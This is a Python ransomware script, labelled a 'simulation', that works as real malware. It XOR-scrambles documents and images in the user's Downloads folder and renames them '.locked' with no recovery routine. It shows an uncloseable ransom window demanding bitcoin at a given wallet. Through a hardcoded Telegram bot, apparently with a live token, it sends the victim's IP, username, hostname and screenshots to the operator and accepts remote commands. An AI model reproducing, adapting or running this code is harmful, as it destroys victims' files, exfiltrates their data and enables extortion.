import os
import time
import threading
import tkinter as tk
from tkinter import messagebox
import requests
from PIL import ImageGrab
import socket
import getpass
import sys

# ========= YOUR TELEGRAM INFO HERE ==========
BOT_TOKEN = "8020430333:AAHBG99o-nJSgjaFYZqBZcnbOG3R-GMuVFo"
CHAT_ID = "7246905933"
# ============================================

# Fake Ransomware Settings
TARGET_DIRS = [os.path.expanduser("~/Downloads")]
TARGET_EXT = [".txt", ".docx", ".png", ".jpeg"]
LOCKED_EXT = ".locked"

# Message shown in GUI
MESSAGE = """YOUR FILES HAVE BEEN ENCRYPTED 💀

To recover them:
1. Send 0.5 BTC to: 1FfmbHfnpaZjKFvyi1okTjJJusN455paPH
2. Contact: khaled@protonmail.com

You have 24 hours before files are permanently deleted!
"""

ENCRYPTED_COUNT = 0
lock = threading.Lock()
running = True

# "Encryption"
def encrypt_file(file_path):
    global ENCRYPTED_COUNT
    try:
        with open(file_path, "r+b") as f:
            content = f.read()
            encrypted = bytearray([b ^ 0xAA for b in content])
            f.seek(0)
            f.write(encrypted)
        os.rename(file_path, file_path + LOCKED_EXT)
        with lock:
            ENCRYPTED_COUNT += 1
    except:
        pass

def run_encryption():
    for directory in TARGET_DIRS:
        for root, _, files in os.walk(directory):
            for file in files:
                ext = os.path.splitext(file)[1].lower()
                if ext in TARGET_EXT:
                    full_path = os.path.join(root, file)
                    encrypt_file(full_path)

# Telegram Functions
def send_attack_started_notification():
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage" 
    msg = "🟢 Simulated Ransomware Started\nFiles are being encrypted...\nSigned: khaled.s.haddad"
    payload = {"chat_id": CHAT_ID, "text": msg}
    try:
        requests.post(url, data=payload)
    except:
        pass

def get_public_ip():
    try:
        return requests.get("https://api.ipify.org").text 
    except:
        return "Unknown"

def send_ip_info():
    ip = get_public_ip()
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage" 
    msg = f"🌐 Victim Public IP: {ip}\nSigned: khaled.s.haddad"
    payload = {"chat_id": CHAT_ID, "text": msg}
    try:
        requests.post(url, data=payload)
    except:
        pass

def send_user_and_hostname():
    user = getpass.getuser()
    host = socket.gethostname()
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage" 
    msg = f"🧑 User: {user}\n💻 Hostname: {host}\nSigned: khaled.s.haddad"
    payload = {"chat_id": CHAT_ID, "text": msg}
    try:
        requests.post(url, data=payload)
    except:
        pass

def send_encrypted_count():
    time.sleep(5)  # Wait until encryption starts
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage" 
    msg = f"📁 Total Files Encrypted: {ENCRYPTED_COUNT}\nSigned: khaled.s.haddad"
    payload = {"chat_id": CHAT_ID, "text": msg}
    try:
        requests.post(url, data=payload)
    except:
        pass

def send_screenshot():
    screenshot_path = "ransom_screenshot.png"
    ImageGrab.grab().save(screenshot_path)
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto" 
    payload = {"chat_id": CHAT_ID}
    try:
        with open(screenshot_path, "rb") as photo:
            files = {"photo": photo}
            requests.post(url, data=payload, files=files)
        os.remove(screenshot_path)
    except:
        pass

def check_telegram_messages():
    offset = 0
    while running:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates?offset={offset}"
        try:
            response = requests.get(url).json()
            if response["ok"]:
                for update in response["result"]:
                    offset = update["update_id"] + 1
                    message = update.get("message", {})
                    text = message.get("text", "").lower()
                    chat_id = message.get("chat", {}).get("id")

                    if text == "/screenshot":
                        send_screenshot()
                    elif text == "/exit":
                        messagebox.showinfo("Command", "Exiting ransomware simulation.")
                        os._exit(0)
        except Exception as e:
            pass
        time.sleep(5)

# GUI 
class RansomGUI:
    def __init__(self, root):
        self.root = root
        self.seconds_left = 86400  # 24 hours

        root.title("Who Am I")
        root.geometry("600x400")
        root.configure(bg="black")

        self.label = tk.Label(root, text=MESSAGE, fg="lime", bg="black", font=("Courier", 12))
        self.label.pack(pady=20)

        self.timer_label = tk.Label(root, text="", fg="red", bg="black", font=("Courier", 18, "bold"))
        self.timer_label.pack(pady=10)

        self.signature = tk.Label(root, text="Signed: khaled.s.haddad", fg="lime", bg="black",
                                  font=("Courier", 10))
        self.signature.pack(side="bottom", pady=10)

        self.update_timer()

    def update_timer(self):
        if not running:
            return
        hours = self.seconds_left // 3600
        minutes = (self.seconds_left % 3600) // 60
        seconds = self.seconds_left % 60
        self.timer_label.config(text=f"Time Left: {hours:02}:{minutes:02}:{seconds:02}")
        if self.seconds_left > 0:
            self.seconds_left -= 1
            self.root.after(1000, self.update_timer)

# Main
def start_attack():
    send_attack_started_notification()
    send_ip_info()
    send_user_and_hostname()

    threading.Thread(target=run_encryption).start()
    threading.Thread(target=send_telegram_notification).start()
    threading.Thread(target=send_encrypted_count).start()
    threading.Thread(target=check_telegram_messages).start()

    root = tk.Tk()
    app = RansomGUI(root)
    root.protocol("WM_DELETE_WINDOW", lambda: None)  # Disable close button
    root.mainloop()

# Separate function for sending initial notification
def send_telegram_notification():
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage" 
    msg = "🛑 Simulated Ransomware Activated\nTarget files encrypted.\nSigned: khaled.s.haddad"
    payload = {"chat_id": CHAT_ID, "text": msg}
    try:
        requests.post(url, data=payload)
    except:
        pass

if __name__ == "__main__":
    start_attack()
